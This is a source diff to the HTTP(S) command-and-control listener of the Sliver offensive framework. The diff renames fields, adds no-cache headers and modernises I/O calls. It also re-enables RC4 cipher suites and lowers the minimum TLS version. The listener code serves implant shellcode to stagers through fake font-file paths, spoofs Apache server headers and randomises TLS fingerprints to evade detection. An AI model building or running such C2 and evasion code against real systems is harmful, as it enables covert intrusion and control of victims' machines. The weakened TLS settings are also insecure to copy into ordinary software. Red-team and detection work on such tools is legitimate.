@@ -28,7 +28,6 @@ import (
 	"errors"
 	"fmt"
 	"io"
-	"io/ioutil"
 	insecureRand "math/rand"
 	"net"
 	"net/http"
@@ -79,10 +78,10 @@ var (
 
 // HTTPSession - Holds data related to a sliver c2 session
 type HTTPSession struct {
-	ID         string
-	ImplanConn *core.ImplantConnection
-	CipherCtx  *cryptography.CipherContext
-	Started    time.Time
+	ID          string
+	ImplantConn *core.ImplantConnection
+	CipherCtx   *cryptography.CipherContext
+	Started     time.Time
 }
 
 // HTTPSessions - All currently open HTTP sessions
@@ -147,7 +146,7 @@ type SliverHTTPC2 struct {
 
 func (s *SliverHTTPC2) getServerHeader() string {
 	if serverVersionHeader == "" {
-		switch insecureRand.Intn(1) {
+		switch insecureRand.Intn(2) {
 		case 0:
 			serverVersionHeader = fmt.Sprintf("Apache/2.4.%d (Unix)", insecureRand.Intn(48))
 		default:
@@ -172,7 +171,9 @@ func (s *SliverHTTPC2) LoadC2Config() *configs.HTTPC2Config {
 }
 
 // StartHTTPListener - Start an HTTP(S) listener, this can be used to start both
-//						HTTP/HTTPS depending on the caller's conf
+//
+//	HTTP/HTTPS depending on the caller's conf
+//
 // TODO: Better error handling, configurable ACME host/port
 func StartHTTPListener(conf *HTTPServerConfig) (*SliverHTTPC2, error) {
 	httpLog.Infof("Starting https listener on '%s'", conf.Addr)
@@ -254,11 +255,18 @@ func getHTTPSConfig(conf *HTTPServerConfig) *tls.Config {
 
 	// Randomize the JARM fingerprint
 	switch insecureRand.Intn(4) {
+
+	// So it turns out that Windows by default
+	// disables TLS v1.2 because it's horrible.
+	// So anyways for compatibility we'll specify
+	// a min of 1.1 or 1.0
+
 	case 0:
 		// tlsConfig.MinVersion = tls.VersionTLS13
 		fallthrough // For compatibility with winhttp
 	case 1:
-		tlsConfig.MinVersion = tls.VersionTLS12
+		// tlsConfig.MinVersion = tls.VersionTLS12
+		fallthrough // For compatibility with winhttp
 	case 2:
 		tlsConfig.MinVersion = tls.VersionTLS11
 	default:
@@ -267,17 +275,17 @@ func getHTTPSConfig(conf *HTTPServerConfig) *tls.Config {
 
 	// Randomize the cipher suites
 	allCipherSuites := []uint16{
-		// tls.TLS_RSA_WITH_RC4_128_SHA,     //uint16 = 0x0005
-		tls.TLS_RSA_WITH_3DES_EDE_CBC_SHA,   //uint16 = 0x000a
-		tls.TLS_RSA_WITH_AES_128_CBC_SHA,    //uint16 = 0x002f
-		tls.TLS_RSA_WITH_AES_256_CBC_SHA,    //uint16 = 0x0035
-		tls.TLS_RSA_WITH_AES_128_CBC_SHA256, //uint16 = 0x003c
-		tls.TLS_RSA_WITH_AES_128_GCM_SHA256, //uint16 = 0x009c
-		tls.TLS_RSA_WITH_AES_256_GCM_SHA384, //uint16 = 0x009d
-		// tls.TLS_ECDHE_ECDSA_WITH_RC4_128_SHA,  //uint16 = 0xc007
-		tls.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA, //uint16 = 0xc009
-		tls.TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA, //uint16 = 0xc00a
-		// tls.TLS_ECDHE_RSA_WITH_RC4_128_SHA,    //uint16 = 0xc011
+		tls.TLS_RSA_WITH_RC4_128_SHA,                      //uint16 = 0x0005
+		tls.TLS_RSA_WITH_3DES_EDE_CBC_SHA,                 //uint16 = 0x000a
+		tls.TLS_RSA_WITH_AES_128_CBC_SHA,                  //uint16 = 0x002f
+		tls.TLS_RSA_WITH_AES_256_CBC_SHA,                  //uint16 = 0x0035
+		tls.TLS_RSA_WITH_AES_128_CBC_SHA256,               //uint16 = 0x003c
+		tls.TLS_RSA_WITH_AES_128_GCM_SHA256,               //uint16 = 0x009c
+		tls.TLS_RSA_WITH_AES_256_GCM_SHA384,               //uint16 = 0x009d
+		tls.TLS_ECDHE_ECDSA_WITH_RC4_128_SHA,              //uint16 = 0xc007
+		tls.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA,          //uint16 = 0xc009
+		tls.TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA,          //uint16 = 0xc00a
+		tls.TLS_ECDHE_RSA_WITH_RC4_128_SHA,                //uint16 = 0xc011
 		tls.TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA,           //uint16 = 0xc012
 		tls.TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA,            //uint16 = 0xc013
 		tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,            //uint16 = 0xc014
@@ -347,7 +355,7 @@ func (s *SliverHTTPC2) router() *mux.Router {
 	// GET /fonts/Inter-Medium.woff/B64_ENCODED_PAYLOAD_UUID
 	router.HandleFunc(
 		fmt.Sprintf("/{rpath:.*\\.%s[/]{0,1}.*$}", c2Config.ImplantConfig.StagerFileExt),
-		s.stagerHander,
+		s.stagerHandler,
 	).MatcherFunc(s.filterOTP).Methods(http.MethodGet)
 
 	// Default handler returns static content or 404s
@@ -358,6 +366,10 @@ func (s *SliverHTTPC2) router() *mux.Router {
 	router.Use(s.DefaultRespHeaders)
 
 	return router
+}
+
+func (s *SliverHTTPC2) noCacheHeader(resp http.ResponseWriter) {
+	resp.Header().Add("Cache-Control", "no-store, no-cache, must-revalidate")
 }
 
 // This filters requests that do not have a valid nonce
@@ -479,6 +491,7 @@ func (s *SliverHTTPC2) websiteContentHandler(resp http.ResponseWriter, req *http
 		return err
 	}
 	resp.Header().Set("Content-type", contentType)
+	s.noCacheHeader(resp)
 	resp.Write(content)
 	return nil
 }
@@ -507,7 +520,7 @@ func (s *SliverHTTPC2) startSessionHandler(resp http.ResponseWriter, req *http.R
 		s.defaultHandler(resp, req)
 		return
 	}
-	body, err := ioutil.ReadAll(req.Body)
+	body, err := io.ReadAll(req.Body)
 	if err != nil {
 		httpLog.Errorf("Failed to read body %s", err)
 		s.defaultHandler(resp, req)
@@ -563,7 +576,7 @@ func (s *SliverHTTPC2) startSessionHandler(resp http.ResponseWriter, req *http.R
 		return
 	}
 	httpSession.CipherCtx = cryptography.NewCipherContext(sKey)
-	httpSession.ImplanConn = core.NewImplantConnection("http(s)", getRemoteAddr(req))
+	httpSession.ImplantConn = core.NewImplantConnection("http(s)", getRemoteAddr(req))
 	s.HTTPSessions.Add(httpSession)
 	httpLog.Infof("Started new session with http session id: %s", httpSession.ID)
 
@@ -580,6 +593,7 @@ func (s *SliverHTTPC2) startSessionHandler(resp http.ResponseWriter, req *http.R
 		Secure:   false,
 		HttpOnly: true,
 	})
+	s.noCacheHeader(resp)
 	resp.Write(encoder.Encode(responseCiphertext))
 }
 
@@ -590,7 +604,7 @@ func (s *SliverHTTPC2) sessionHandler(resp http.ResponseWriter, req *http.Reques
 		s.defaultHandler(resp, req)
 		return
 	}
-	httpSession.ImplanConn.UpdateLastMessage()
+	httpSession.ImplantConn.UpdateLastMessage()
 
 	plaintext, err := s.readReqBody(httpSession, resp, req)
 	if err != nil {
@@ -609,16 +623,16 @@ func (s *SliverHTTPC2) sessionHandler(resp http.ResponseWriter, req *http.Reques
 	resp.WriteHeader(http.StatusAccepted)
 	handlers := sliverHandlers.GetHandlers()
 	if envelope.ID != 0 {
-		httpSession.ImplanConn.RespMutex.RLock()
-		defer httpSession.ImplanConn.RespMutex.RUnlock()
-		if resp, ok := httpSession.ImplanConn.Resp[envelope.ID]; ok {
+		httpSession.ImplantConn.RespMutex.RLock()
+		defer httpSession.ImplantConn.RespMutex.RUnlock()
+		if resp, ok := httpSession.ImplantConn.Resp[envelope.ID]; ok {
 			resp <- envelope
 		}
 	} else if handler, ok := handlers[envelope.Type]; ok {
-		respEnvelope := handler(httpSession.ImplanConn, envelope.Data)
+		respEnvelope := handler(httpSession.ImplantConn, envelope.Data)
 		if respEnvelope != nil {
 			go func() {
-				httpSession.ImplanConn.Send <- respEnvelope
+				httpSession.ImplantConn.Send <- respEnvelope
 			}()
 		}
 	}
@@ -631,13 +645,13 @@ func (s *SliverHTTPC2) pollHandler(resp http.ResponseWriter, req *http.Request) 
 		s.defaultHandler(resp, req)
 		return
 	}
-	httpSession.ImplanConn.UpdateLastMessage()
+	httpSession.ImplantConn.UpdateLastMessage()
 
 	// We already know we have a valid nonce because of the middleware filter
 	nonce, _ := getNonceFromURL(req.URL)
 	_, encoder, _ := encoders.EncoderFromNonce(nonce)
 	select {
-	case envelope := <-httpSession.ImplanConn.Send:
+	case envelope := <-httpSession.ImplantConn.Send:
 		resp.WriteHeader(http.StatusOK)
 		envelopeData, _ := proto.Marshal(envelope)
 		ciphertext, err := httpSession.CipherCtx.Encrypt(envelopeData)
@@ -645,6 +659,7 @@ func (s *SliverHTTPC2) pollHandler(resp http.ResponseWriter, req *http.Request) 
 			httpLog.Errorf("Failed to encrypt message %s", err)
 			ciphertext = []byte{}
 		}
+		s.noCacheHeader(resp)
 		resp.Write(encoder.Encode(ciphertext))
 	case <-req.Context().Done():
 		httpLog.Debug("Poll client hang up")
@@ -652,6 +667,7 @@ func (s *SliverHTTPC2) pollHandler(resp http.ResponseWriter, req *http.Request) 
 	case <-time.After(s.getServerPollTimeout()):
 		httpLog.Debug("Poll time out")
 		resp.WriteHeader(http.StatusNoContent)
+		s.noCacheHeader(resp)
 		resp.Write([]byte{})
 	}
 }
@@ -665,7 +681,7 @@ func (s *SliverHTTPC2) readReqBody(httpSession *HTTPSession, resp http.ResponseW
 		return nil, ErrInvalidEncoder
 	}
 
-	body, err := ioutil.ReadAll(&io.LimitedReader{
+	body, err := io.ReadAll(&io.LimitedReader{
 		R: req.Body,
 		N: int64(s.ServerConf.MaxRequestLength),
 	})
@@ -718,11 +734,12 @@ func (s *SliverHTTPC2) closeHandler(resp http.ResponseWriter, req *http.Request)
 	resp.WriteHeader(http.StatusAccepted)
 }
 
-// stagerHander - Serves the sliver shellcode to the stager requesting it
-func (s *SliverHTTPC2) stagerHander(resp http.ResponseWriter, req *http.Request) {
+// stagerHandler - Serves the sliver shellcode to the stager requesting it
+func (s *SliverHTTPC2) stagerHandler(resp http.ResponseWriter, req *http.Request) {
 	httpLog.Debug("Stager request")
 	if len(s.SliverStage) != 0 {
 		httpLog.Infof("Received staging request from %s", getRemoteAddr(req))
+		s.noCacheHeader(resp)
 		resp.Write(s.SliverStage)
 		httpLog.Infof("Serving sliver shellcode (size %d) to %s", len(s.SliverStage), getRemoteAddr(req))
 		resp.WriteHeader(http.StatusOK)
@@ -735,7 +752,7 @@ func (s *SliverHTTPC2) getHTTPSession(req *http.Request) *HTTPSession {
 	for _, cookie := range req.Cookies() {
 		httpSession := s.HTTPSessions.Get(cookie.Value)
 		if httpSession != nil {
-			httpSession.ImplanConn.UpdateLastMessage()
+			httpSession.ImplantConn.UpdateLastMessage()
 			return httpSession
 		}
 	}
